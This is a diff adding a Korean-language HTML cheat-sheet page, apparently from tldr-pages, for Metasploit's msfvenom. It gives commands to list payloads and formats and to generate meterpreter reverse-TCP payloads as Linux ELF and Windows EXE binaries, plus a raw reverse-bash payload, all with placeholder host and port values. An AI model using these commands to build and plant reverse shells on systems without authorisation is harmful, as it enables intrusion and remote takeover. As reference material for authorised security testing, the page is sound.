@@ -1,0 +1,40 @@
+<h1 id="msfvenom">msfvenom</h1>
+
+<p>Metasploit의 페이로드를 수동으로 생성.
+더 많은 정보: <a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom">https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom</a>.</p>
+
+<ul>
+  <li>페이로드 목록 표시:</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">msfvenom -l payloads</code></p>
+
+<ul>
+  <li>형식 목록 표시:</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">msfvenom -l formats</code></p>
+
+<ul>
+  <li>페이로드 옵션 표시:</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">msfvenom -p </code><span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">페이로드</span><code class="language-plaintext highlighter-rouge"> --list-options</code></p>
+
+<ul>
+  <li>역방향 TCP 핸들러로 ELF 바이너리 생성:</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=</code><span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">로컬_IP</span><code class="language-plaintext highlighter-rouge"> LPORT=</code><span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">로컬_포트</span><code class="language-plaintext highlighter-rouge"> -f elf -o </code><span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">경로/대상/바이너리</span></p>
+
+<ul>
+  <li>역방향 TCP 핸들러로 EXE 바이너리 생성:</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=</code><span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">로컬_IP</span><code class="language-plaintext highlighter-rouge"> LPORT=</code><span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">로컬_포트</span><code class="language-plaintext highlighter-rouge"> -f exe -o </code><span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">경로/대상/바이너리.exe</span></p>
+
+<ul>
+  <li>역방향 TCP 핸들러로 원시 Bash 생성:</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">msfvenom -p cmd/unix/reverse_bash LHOST=</code><span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">로컬_IP</span><code class="language-plaintext highlighter-rouge"> LPORT=</code><span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">로컬_포트</span><code class="language-plaintext highlighter-rouge"> -f raw</code></p>
